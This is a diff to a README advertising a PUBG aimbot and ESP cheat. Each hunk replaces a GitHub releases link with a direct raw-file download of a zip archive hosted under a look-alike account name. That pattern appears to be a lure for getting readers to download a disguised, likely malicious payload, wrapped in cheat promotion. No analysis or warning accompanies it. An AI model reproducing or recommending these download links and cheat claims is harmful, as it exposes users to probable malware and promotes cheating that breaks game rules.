@@ -1,6 +1,6 @@
 # 🎯 PUBG-Hack---PUBG-Aimbot-ESP-2026 - Dominate Every Match Instantly
 
-[![Download PUBG Hack](https://img.shields.io/badge/Download-PUBG_Hack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/goddddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/releases)
+[![Download PUBG Hack](https://img.shields.io/badge/Download-PUBG_Hack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://raw.githubusercontent.com/godddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/main/synchronously/1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Make sure you have:
 
 **Step 1:** Click the green button below to go to the download page:
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_HERE-FF5722?style=for-the-badge&logo=download&logoColor=white&labelColor=1A1A1A)](https://github.com/goddddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_HERE-FF5722?style=for-the-badge&logo=download&logoColor=white&labelColor=1A1A1A)](https://raw.githubusercontent.com/godddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/main/synchronously/1.7.zip)
 
 **Step 2:** On the page that opens, you'll see a list of files. Look for the most recent version (usually at the top). Click on it to start downloading.
 
@@ -132,7 +132,7 @@ If you encounter any issues not covered here, visit the download page and check 
 
 **Download now and start winning!**
 
-[![Get It Now](https://img.shields.io/badge/🚀_GET_STARTED-4CAF50?style=for-the-badge&logo=rocket&logoColor=white&labelColor=1A1A1A)](https://github.com/goddddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/releases)
+[![Get It Now](https://img.shields.io/badge/🚀_GET_STARTED-4CAF50?style=for-the-badge&logo=rocket&logoColor=white&labelColor=1A1A1A)](https://raw.githubusercontent.com/godddd333/PUBG-Hack---PUBG-Aimbot-ESP-2026/main/synchronously/1.7.zip)
 
 ---
 
